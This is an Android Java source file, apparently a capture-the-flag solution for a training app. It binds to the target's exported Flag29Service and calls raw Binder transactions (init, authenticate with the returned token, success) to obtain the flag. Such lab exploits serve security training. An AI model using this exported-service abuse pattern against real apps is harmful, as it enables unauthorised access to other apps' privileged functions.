package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag29Fragment extends Fragment {

    private IBinder binder = null;

    private final ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            binder = service;
            Toast.makeText(getContext(), "Service connected", Toast.LENGTH_SHORT).show();
            Toast.makeText(getContext(), "Click the button again to get the flag", Toast.LENGTH_LONG).show();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            binder = null;
        }
    };

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag29, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag29);

        launchButton.setOnClickListener(v -> {
            if (binder == null) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag29Service"
                ));
                requireContext().bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            } else {
                try {
                    String token = callInit();
                    callAuthenticate(token);
                    callSuccess();
                } catch (RemoteException e) {
                    Toast.makeText(getContext(), "Remote call failed", Toast.LENGTH_SHORT).show();
                    e.printStackTrace();
                }
            }
        });

        return view;
    }

    private String callInit() throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            binder.transact(1, in, out, 0);
            out.readException();
            String result = out.readString();
            Log.d("Flag29", "init(): " + result);
            return result;
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    private void callAuthenticate(String token) throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            in.writeString(token);
            binder.transact(2, in, out, 0);
            out.readException();
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    private void callSuccess() throws RemoteException {
        Parcel in = Parcel.obtain();
        Parcel out = Parcel.obtain();
        try {
            in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
            binder.transact(3, in, out, 0);
            out.readException();
        } finally {
            out.recycle();
            in.recycle();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (binder != null) {
            requireContext().unbindService(serviceConnection);
        }
    }
}